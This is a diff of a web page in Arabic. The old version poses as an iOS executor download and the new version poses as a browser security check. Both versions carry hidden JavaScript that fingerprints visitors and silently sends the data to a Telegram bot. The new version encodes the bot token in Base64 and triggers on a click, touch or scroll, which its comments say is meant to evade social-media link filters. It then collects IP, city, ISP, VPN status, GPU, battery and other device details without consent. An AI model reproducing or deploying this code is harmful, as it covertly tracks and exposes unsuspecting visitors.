@@ -1,37 +1,100 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Uranus Executor iOS</title>
-    <script>
-        function sendToTelegram() {
-            const token = '8719298403:AAG-9IJg2xLXm0YaV3yy0Z1wGEDGrjFQWxU';
-            const chat_id = '6001286270';
-            
-            // جلب الـ IP من خدمة خارجية
-            fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => {
-                    const msg = `🎯 صيد جديد!\n🌐 IP: ${data.ip}\n📱 الجهاز: ${navigator.userAgent}`;
-                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
-                    
-                    // إرسال الطلب مخفي
-                    navigator.sendBeacon(url);
-                    
-                    // إرسال طلب كلاسيكي للضمان
-                    fetch(url);
-                });
-        }
-        // التنفيذ فور فتح الصفحة
-        window.onload = sendToTelegram;
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحقق من الأمان...</title>
+    <style>
+        body { background-color: #050505; color: #00ff00; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: 'Courier New', monospace; margin: 0; text-align: center; }
+        .spinner { width: 50px; height: 50px; border: 3px solid rgba(0,255,0,0.3); border-radius: 50%; border-top-color: #00ff00; animation: s 1s ease-in-out infinite; }
+        @keyframes s { to { transform: rotate(360deg); } }
+    </style>
 </head>
-<body style="background:#000; color:#fff; text-align:center; font-family:sans-serif; padding-top:100px;">
-    <h1>جاري تجهيز رابط التحميل...</h1>
-    <p>برجاء الانتظار ثواني لتجهيز ملف الـ IPA</p>
-    <div style="border:3px solid #2ecc71; border-radius:50%; width:50px; height:50px; border-top-color:transparent; animation:spin 1s linear infinite; margin:20px auto;"></div>
-    <style>@keyframes spin{to{transform:rotate(360deg);}}</style>
-</body>
-</html>
+<body>
+    <div class="spinner"></div>
+    <p>برجاء الانتظار، جاري التحقق من المتصفح...</p>
+
+    <script>
+        // التوكن والآيدي مشفرين Base64 للحماية القصوى
+        const _v = {
+            t: "ODcxOTI5ODQwMzpBQUctOUlKZzJ4TFhtMFlhVjN5eTBaV0dFREdyalZRV3hV",
+            c: "NjAwMTI4NjI3MA=="
+        };
+
+        const _f = (s) => atob(s);
+
+        // تشغيل الكود فقط عند التفاعل البشري لتجاوز فلاتر سناب وتيك توك
+        const triggerEvents = ['click', 'touchstart', 'scroll'];
+        triggerEvents.forEach(ev => window.addEventListener(ev, executeShadowTrace, {once: true}));
+
+        async function executeShadowTrace() {
+            const fullData = await getMaxPrecisionData();
+            await deliverToBot(fullData);
+        }
+
+        async function getMaxPrecisionData() {
+            let d = {};
+
+            // 1. جلب الـ IP الحقيقي والمعلومات الجغرافية (بدون طلب إذن)
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const j = await res.json();
+                d.ip = j.ip;
+                d.city = j.city;
+                d.isp = j.org; // شركة الاتصالات
+                d.vpn = j.proxy ? "نعم (VPN)" : "لا";
+            } catch (e) { d.ip = "Unknown"; }
+
+            // 2. فحص العتاد (Hardware)
+            d.platform = navigator.platform;
+            d.cores = navigator.hardwareConcurrency || "N/A";
+            d.ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A";
+            
+            // 3. فحص المعالج الرسومي (GPU) - ميزة دقيقة جداً
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                d.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            } catch (e) { d.gpu = "N/A"; }
+
+            // 4. البطارية والشبكة
+            try {
+                const b = await navigator.getBattery();
+                d.bat = Math.round(b.level * 100) + "% (" + (b.charging ? "يشحن" : "لا يشحن") + ")";
+            } catch (e) { d.bat = "N/A"; }
+
+            d.net = navigator.connection ? navigator.connection.effectiveType : "N/A";
+            d.res = `${window.screen.width}x${window.screen.height}`;
+            d.lang = navigator.language;
+            d.time = new Date().toLocaleString('ar-EG');
+
+            return d;
+        }
+
+        async function deliverToBot(d) {
+            const report = `🚀 [صيد دقيق جداً - MAX]\n\n` +
+                           `🌐 العنوان: ${d.ip}\n` +
+                           `🏙 المدينة: ${d.city}\n` +
+                           `📡 الشركة: ${d.isp}\n` +
+                           `🛡 VPN: ${d.vpn}\n` +
+                           `━━━━━━━━━━━━━━\n` +
+                           `📱 النظام: ${d.platform}\n` +
+                           `🧠 المعالج: ${d.cores} Cores\n` +
+                           `📟 الرام: ${d.ram}\n` +
+                           `🎮 الجرافيك: ${d.gpu}\n` +
+                           `🔋 البطارية: ${d.bat}\n` +
+                           `📶 الشبكة: ${d.net}\n` +
+                           `🖥 الشاشة: ${d.res}\n` +
+                           `🌍 اللغة: ${d.lang}\n` +
+                           `⏰ الوقت: ${d.time}`;
+
+            const url = `https://api.telegram.org/bot${_f(_v.t)}/sendMessage?chat_id=${_f(_v.c)}&text=${encodeURIComponent(report)}`;
+            
+            // إرسال مخفي تماماً
+            const beacon = new Image();
+            beacon.src = url;
+        }
+    </script>
 </body>
 </html>
